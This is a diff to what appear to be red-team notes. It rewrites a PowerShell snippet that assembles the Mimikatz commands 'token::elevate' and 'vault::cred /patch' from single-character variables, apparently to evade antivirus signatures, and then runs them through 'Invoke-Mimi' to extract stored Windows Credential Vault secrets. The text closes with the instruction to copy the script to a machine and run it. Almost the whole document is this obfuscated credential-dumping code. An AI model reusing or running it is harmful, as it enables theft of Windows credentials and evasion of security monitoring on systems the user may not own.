@@ -42,47 +42,19 @@ Invoke-Mimi -Command $Pwn
 
 Same thing for Credential Vault
 ```powershell
-$a1 = "t"
-$a2 = "o"
-$a3 = "k"
-$a4 = "e"
-$a5 = "n"
-$a6 = ":"
-$a7 = ":"
-$a8 = "e"
-$a9 = "l"
-$a10 = "v"
-$a11 = "a"
-$a12 = "t"
-$a13 = "e"
+$8 = "t"; $c = "o"; $g = "k"; $t = "e"; $p = "n"; $n = ":"; $7 = ":"; $6 = "e"; $l = "l"; $2 = "e"; $z = "v"; $e = "a"; $0 = "t"; $s = "e";
+$cmd1 = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s;
 
-$b1 = "v"
-$b2 = "a"
-$b3 = "u"
-$b4 = "l"
-$b5 = "t"
-$b6 = ":"
-$b7 = ":"
-$b8 = "c"
-$b9 = "r"
-$b10 = "e"
-$b11 = "d"
-$b12 = " "
-$b13 = "/"
-$b14 = "p"
-$b15 = "a"
-$b16 = "t"
-$b17 = "c"
-$b18 = "h"
+$v1 = "v"; $v2 = "a"; $v3 = "u"; $v4 = "l"; $v5 = "t"; $v6 = ":"; $v7 = ":"; $v8 = "c"; $v9 = "r"; $v10 = "e"; $v11 = "d";
+$v12 = " "; $v13 = "/"; $v14 = "p"; $v15 = "a"; $v16 = "t"; $v17 = "c"; $v18 = "h"; $v19 = '"';
+$cmd2 = $v19 + $v1 + $v2 + $v3 + $v4 + $v5 + $v6 + $v7 + $v8 + $v9 + $v10 + $v11 + $v12 + $v13 + $v14 + $v15 + $v16 + $v17 + $v18 + $v19;
 
-# Build first command: token::elevate
-$cmd1 = $a1 + $a2 + $a3 + $a4 + $a5 + $a6 + $a7 + $a8 + $a9 + $a8 + $a10 + $a11 + $a12 + $a4
+# Concatenate both commands into a single string
+$Pwn = $cmd1 + " " + $cmd2
 
-# Build second command: vault::cred /patch
-$cmd2 = $b1 + $b2 + $b3 + $b4 + $b5 + $b6 + $b7 + $b8 + $b9 + $b10 + $b11 + $b12 + $b13 + $b14 + $b15 + $b16 + $b17 + $b18
+# Run it
+Invoke-Mimi -Command $Pwn
 
-# Run them
-Invoke-Mimi -Command $cmd1 $cmd2
 ```
 
 Copy to machine and run
